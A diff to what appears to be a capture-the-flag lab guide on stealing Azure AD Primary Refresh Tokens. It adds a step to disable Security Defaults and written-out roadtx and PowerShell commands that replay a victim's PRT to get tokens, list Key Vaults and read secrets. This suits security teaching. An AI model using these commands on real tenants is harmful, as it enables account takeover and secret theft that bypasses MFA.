@@ -15,6 +15,12 @@ A PRT is issued by Azure AD's CloudAP (Cloud Authentication Provider) plugin whe
 
 Because the PRT embeds the device identity, it bypasses conditional access policies that require MFA or a compliant device. An attacker who extracts it can replay it from any machine.
 
+## Prerequisites
+
+> ⚠️ **Security Defaults must be disabled** in your Entra ID tenant before deploying this lab. Security Defaults enforce MFA on Azure Management (ARM), which blocks subscription enumeration even with a valid PRT.
+>
+> **Azure portal → Entra ID → Properties → Manage security defaults → Disabled**
+
 ## Deploy
 
 ```shell
@@ -68,7 +74,32 @@ The output shows **three values** — copy all of them:
 
 ### Step 4 — Authenticate as the victim (roadtx — recommended)
 
-On your attacking machine, use [roadtx](https://github.com/dirkjanm/ROADtools) with the **Clear key**:
+On your attacking machine, use [roadtx](https://github.com/dirkjanm/ROADtools) with the **Clear key**.
+
+#### 4a — Enumerate the subscription to discover resources
+
+An attacker does not know the Key Vault name upfront. Get an ARM token first and enumerate:
+
+```shell
+roadtx prtauth \
+  --prt <PRT> \
+  --prt-sessionkey <Clear_key> \
+  --resource https://management.azure.com/
+```
+
+Load the token into Azure PowerShell and list all Key Vaults the victim can access:
+
+```powershell
+$token = (python3 -c "import json; print(json.load(open('.roadtools_auth'))['accessToken'])")
+Connect-AzAccount -AccessToken $token -AccountId <victim_upn>
+Get-AzKeyVault
+```
+
+> `Connect-AzAccount -AccessToken` lets you inject any Bearer token directly into the Az PowerShell session — no interactive login needed.
+
+#### 4b — Read the flag from Key Vault
+
+Get a Key Vault-scoped token and read the secret:
 
 ```shell
 roadtx prtauth \
@@ -77,7 +108,13 @@ roadtx prtauth \
   --resource https://vault.azure.net/
 ```
 
-Read the flag directly:
+```powershell
+$kvToken = (python3 -c "import json; print(json.load(open('.roadtools_auth'))['accessToken'])")
+$headers = @{ Authorization = "Bearer $kvToken" }
+(Invoke-RestMethod -Uri "https://<keyvault_name>.vault.azure.net/secrets/flag?api-version=7.4" -Headers $headers).value
+```
+
+Or with curl:
 
 ```shell
 TOKEN=$(python3 -c "import json; print(json.load(open('.roadtools_auth'))['accessToken'])")
@@ -116,17 +153,17 @@ On **any machine**, open Microsoft Edge or Chrome in **private/incognito** mode:
 
 ### Step 6 — Read the flag from Key Vault
 
-In the Azure portal (authenticated as victim):
+Via the Azure portal (authenticated as victim in browser):
 
 1. Navigate to **Key Vaults** → `<keyvault_name>`
 2. **Secrets** → `flag` → click the version → **Show Secret Value**
 
-Or with PowerShell using the token from roadtx:
+Or with PowerShell using an ARM token from roadtx:
 
 ```powershell
-$token = "<access_token>"
-$headers = @{ Authorization = "Bearer $token" }
-(Invoke-RestMethod -Uri "https://<keyvault_name>.vault.azure.net/secrets/flag?api-version=7.4" -Headers $headers).value
+$token = (python3 -c "import json; print(json.load(open('.roadtools_auth'))['accessToken'])")
+Connect-AzAccount -AccessToken $token -AccountId <victim_upn>
+Get-AzKeyVaultSecret -VaultName <keyvault_name> -Name flag -AsPlainText
 ```
 
 ### Step 7 — Submit the flag
